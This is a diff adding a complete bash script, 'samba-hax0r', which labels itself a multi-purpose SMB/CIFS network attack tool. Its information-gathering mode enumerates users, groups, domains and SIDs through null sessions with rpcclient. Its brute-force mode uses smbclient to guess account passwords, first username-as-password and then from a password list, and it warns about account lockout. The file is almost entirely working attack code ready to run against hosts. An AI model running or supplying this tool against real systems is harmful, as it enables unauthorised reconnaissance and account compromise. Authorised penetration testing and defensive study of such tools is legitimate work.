@@ -1,0 +1,377 @@
+#!/bin/bash
+
+#
+# $Id: samba-hax0r,v 1.9 2008/11/27 09:55:56 raptor Exp $
+#
+# samba-hax0r v0.5 - Multi-purpose SMB/CIFS network attack tool
+# Copyright (c) 2005-2008 Marco Ivaldi <raptor@0xdeadbeef.info>
+#
+# Multi-purpose tool for SMB (Server Message Block) and CIFS (Common Internet 
+# File System) network protocols exploitation. Two modes of operation are 
+# currently available: info (Information Gathering) and brute (Brute Force).
+#
+# *** USE IT AT YOUR OWN RISK! BEWARE OF ACCOUNT LOCKING POLICIES! ***
+#
+# Based on:
+# - Samba v3.0.25 suite's smbclient (http://www.samba.org/) 
+# - Samba-TNG v0.4.99 suite's rpcclient (http://www.samba-tng.org/)
+#
+# CHANGELOG (v0.5):
+# - minor cosmetic changes
+# CHANGELOG (v0.4):
+# - brute mode: fixed a typo in the full brute force output (thanx foo!;)
+# CHANGELOG (v0.3):
+# - introduced the -W <domain> option for both info and brute mode
+# - replaced -u/-p with -U/-P; -u/-p are now used for brute mode
+# CHANGELOG (v0.2):
+# - info mode: a couple of new options (-u <user>, -p <pass>)
+# - replaced i=`expr $i + 1` with i=$(($i + 1)) to avoid some fork()s
+# - minor bugfixes and cosmetic changes (further testing still needed)
+#
+# TODO:
+# - implement support for usernames and passwords that contain spaces
+# - implement a much stricter parser for command-line arguments
+# - info mode: enumerate other kinds of information (see rpcclient)?
+# - brute mode: fix false positives, empty password checks (rpcclient?)
+# - brute mode: if no users list has been specified, use "Administrator"
+# - brute mode: enable/disable verbose output and/or logging to file
+# - even more extensive testing on multiple platforms/environments
+#
+
+####################### Edit the following parameters #######################
+
+# External programs
+SMBCLIENT="/usr/bin/smbclient"			# samba.org
+RPCCLIENT="/usr/local/samba/bin/rpcclient"	# samba-tng.org
+
+# Default username, password, and domain
+USER=""
+PASS=""
+DOMAIN=""
+
+# Default range for SID scan
+BEGIN=500
+END=600		# 0 scans all
+
+####################### Function declarations go here #######################
+
+# Print header information
+function header() {
+	echo ""
+	echo "samba-hax0r v0.5 - Multi-purpose SMB/CIFS network attack tool"
+	echo "Copyright (c) 2005-2008 Marco Ivaldi <raptor@0xdeadbeef.info>"
+	echo ""
+}
+
+# Clean-up and exit
+function footer() {
+	echo ""
+	exit 0
+}
+
+# Print script usage (main)
+function usage() {
+echo "./samba-hax0r -m <info|brute> [-h <host>|-f <file>] [options]"
+	echo ""
+	echo "-m info  : enter info gathering mode"
+	echo "-m brute : enter brute force mode"
+	echo "-h host  : target hostname or IP address"
+	echo "-f file  : file contaning a list of targets"
+	echo "options  : see info|brute help"
+	footer
+}
+
+# Print script usage (mode: info)
+function usage_info() {
+echo "./samba-hax0r -m info -t <target> [-U <user> [-P <pass> -W <domain>]] [...]"
+	echo ""
+	echo "-t users    : try to enumerate all users via SAM enum"
+	echo "-t users+   : also, try scanning of SIDs if needed"
+	echo "-t groups   : try to enumerate all groups via SAM enum"
+	echo "-t groups+  : also, try scanning of SIDs if needed"
+	echo "-t domains  : try to enumerate all domains via SAM enum"
+	echo "-t sids     : perform a SID scan only (time consuming)"
+	echo "-t userinfo : get information on the specified user (see -a)"
+	echo "-t groupmem : get members of the specified group (see -a)"
+	echo "-U user     : specify a username (default=<empty>)"
+	echo "-P pass     : specify a password (default=<empty>)"
+	echo "-W domain   : specify a domain or workgroup"
+	echo "-a arg      : required argument for groupmem/userinfo targets"
+	echo "-s startsid : specify the start SID for scan (default=$BEGIN)"
+	echo "-e endsid   : specify the end SID for scan (default=$END)"
+	footer
+}
+
+# Print script usage (mode: brute)
+function usage_brute() {
+echo "./samba-hax0r -m brute -u <userfile> [-p <passfile>] [-W <domain>]"
+	echo ""
+	echo "-u userfile : get users list from file"
+	echo "-p passfile : get passwords list from file"
+	echo "-W domain   : specify a domain or workgroup"
+	footer
+}
+
+# Green colored output
+function green() {
+	echo -e "\033[01;32m$@\033[00m"  
+}
+
+# Yellow colored output (UNUSED)
+function yellow() {
+	echo -e "\033[01;33m$@\033[00m"
+}
+
+# Red colored output (UNUSED)
+function red() {
+	echo -e "\033[01;31m$@\033[00m"
+}
+
+# Enumerate SMB/CIFS objects via NULL session (SAM enum + SID scan)
+function enum() {
+
+	i=0
+
+	# Scan a list of hosts
+	for host in $list
+	do
+		i=$(($i + 1))
+		domain=`$RPCCLIENT -S $host -U "$USER"'%'"$PASS" $DOMAIN -c lsaquery | grep "Domain Con" | cut -d ':' -f 2 | cut -d ' ' -f 2`
+		sid=`$RPCCLIENT -S $host -U "$USER"'%'"$PASS" $DOMAIN -c lsaquery | grep "Domain Con" | cut -d ':' -f 3  | cut -d ' ' -f 2`
+
+		# Check whether there's an error
+		if [ "$sid" == "" ]; then
+			continue
+		fi
+
+		# Output header
+		echo "--------------------------------"
+		echo "Host:   $host"
+		echo "Domain: $domain"
+		echo "SID:    $sid"
+		echo ""
+
+		# Try to enumerate all objects via SAM enum
+		$RPCCLIENT -S $host -U "$USER"'%'"$PASS" $DOMAIN -c "$cmd" | grep -Ev "OpenConfFile|such file|config file|^Server|^Connection|^SAM |^Exit Status|^From:|^Domain=|^OK|^cli_|^SAMR_" | sed -e "s/^\t//" | grep -iv "FAILED"
+
+		# Did it work?
+		if [ $? -eq 0 ]; then
+			continue
+		fi
+		echo "SAM enumeration failed."
+
+		# Perform SID scan
+		if [ $depth -ge 1 ]; then
+			sidscan
+		fi
+	done
+	echo "--------------------------------"
+	echo "$i host(s) scanned."
+}
+
+# Enumerate SMB/CIFS objects via NULL session (SID scan only)
+function enumsids() {
+
+	i=0
+
+	# Scan a list of hosts
+	for host in $list
+	do
+		i=$(($i + 1))
+		domain=`$RPCCLIENT -S $host -U "$USER"'%'"$PASS" $DOMAIN -c lsaquery | grep "Domain Con" | cut -d ':' -f 2 | cut -d ' ' -f 2`
+		sid=`$RPCCLIENT -S $host -U "$USER"'%'"$PASS" $DOMAIN -c lsaquery | grep "Domain Con" | cut -d ':' -f 3  | cut -d ' ' -f 2`
+
+		# Check whether there's an error
+		if [ "$sid" == "" ]; then
+			continue
+		fi
+
+		# Output header
+		echo "--------------------------------"
+		echo "Host:   $host"
+		echo "Domain: $domain"
+		echo "SID:    $sid"
+		echo ""
+
+		# Perform SID scan
+		sidscan
+	done
+	echo "--------------------------------"
+	echo "$i host(s) scanned."
+}
+
+# General purpose SID scanner
+function sidscan() {
+
+	begin=$BEGIN
+	end=$END
+
+	echo "Trying to scan SIDs (range: $begin-$end)..."
+	echo ""
+
+	while :
+	do
+		$RPCCLIENT -S $host -U "$USER"'%'"$PASS" $DOMAIN -c "lookupsids $sid-$begin"  | grep -e 'SID:' | sed -e "s/$sid-//" | grep -v ' (8: UNKNOWN)'
+
+		if [ $begin -eq $end ]; then
+			break
+		else
+			begin=$(($begin + 1))
+		fi
+	done
+}
+
+# Generic SMB/CIFS password brute forcer
+function brute() {
+
+	i=0
+
+	# Scan a list of hosts
+	for host in $list
+	do
+		# Try password=<username>
+		echo "$host"
+
+		for user in `cat $ufile`
+		do
+			$SMBCLIENT -L $host -U "$user%$user" $DOMAIN 1>/dev/null 2>/dev/null
+			#$SMBCLIENT "\\\\$host\\admin\$" -U "$user%$user" $DOMAIN -c 'exit' 1>/dev/null 2>/dev/null # FIXME: IPC$?
+
+			# Check smbclient return value
+			if [ $? -eq 0 ]; then
+				i=$(($i + 1))
+				green "\t${domain}${user}:${user}"
+				continue
+			else
+				echo -e "\t${domain}${user}:${user}"
+			fi
+
+			# Check if full brute force is enabled
+			if [ $fullbrute -eq 0 ]; then
+				continue
+			fi
+
+			# Perform the full brute force attack
+			for pass in `cat $pfile`
+			do
+				$SMBCLIENT -L $host -U "$user%$pass" $DOMAIN 1>/dev/null 2>/dev/null
+				#$SMBCLIENT "\\\\$host\\admin\$" -U "$user%$pass" $DOMAIN -c 'exit' 1>/dev/null 2>/dev/null # FIXME: IPC$?
+
+				# Check smbclient return value
+				if [ $? -eq 0 ]; then
+					i=$(($i + 1))
+					green "\t${domain}${user}:${pass}"
+					break
+				else
+					echo -e "\t${domain}${user}:${pass}"
+				fi
+			done
+		done
+	done
+
+	echo "--------------------------------"
+	echo "$i account(s) found."
+}
+
+####################### The attack script starts here #######################
+
+header
+
+# Parse command line
+while [ ! -z "$1" ]; do
+	case $1 in
+		-m) shift; mode="$1"; shift;;
+		-t) shift; target="$1"; shift;;
+		-h) shift; host="$1"; shift;;
+		-f) shift; hfile="$1"; shift;;
+		-U) shift; USER="$1"; shift;;
+		-P) shift; PASS="$1"; shift;;
+		-W) shift; domain="$1"; shift;;
+		-a) shift; arg="$1"; shift;;
+		-s) shift; BEGIN="$1"; shift;;
+		-e) shift; END="$1"; shift;;
+		-u) shift; ufile="$1"; shift;;
+		-p) shift; pfile="$1"; shift;;
+		* ) usage
+		;;
+		esac
+	done
+
+	# Switch between single and multiple hosts
+	if [ ! -z $hfile ]; then
+		list=`cat $hfile 2>/dev/null`
+		if [ "$list" = "" ]; then
+			echo "error: corrupted targets file?"
+			footer
+		fi
+	elif [ ! -z $host ]; then
+		list=$host
+	else
+		usage
+	fi
+
+	# Use specified domain/workgroup?
+	if [ ! -z $domain ]; then
+		DOMAIN="-W $domain"
+		domain="$domain"'\\'
+	fi
+
+	# Switch mode of operation
+case $mode in
+
+	# Information Gathering Mode
+	"info")
+		case $target in
+			"users"       )	depth=0; cmd="enumusers";;
+			"users+"      )	depth=1; cmd="enumusers";;
+			"groups"      )	depth=0; cmd="enumgroups";;
+			"groups+"     )	depth=1; cmd="enumgroups";;
+			"domains"     )	depth=0; cmd="enumdomains";;
+			"sids"        )	enumsids; footer;;
+			"userinfo"    )	depth=0
+					if [ -z "$arg" ]; then
+						usage_info
+					fi
+					cmd="samuser \"$arg\"";;
+			"groupmem"    )	depth=0
+					if [ -z "$arg" ]; then
+						usage_info
+					fi
+					cmd="samgroupmem \"$arg\"";;
+			*             )	usage_info;;
+		esac
+		enum
+	;;
+
+	# Brute Force Mode
+	"brute")
+		if [ ! -z "$ufile"  ]; then
+			if [ "`cat $ufile 2>/dev/null`" = "" ]; then
+				echo "error: corrupted username file?"
+				footer
+			fi
+			if [ ! -z "$pfile"  ]; then
+				# Get password list from a file
+				fullbrute=1
+				if [ "`cat $pfile 2>/dev/null`" = "" ]; then
+					echo "error: corrupted password file?"
+					footer
+				fi
+				brute
+			else
+				# Test only password=<username>
+				fullbrute=0
+				brute
+			fi
+		else
+			usage_brute
+		fi
+	;;
+
+	# Default
+	*) usage
+	;;
+
+esac
+
+footer
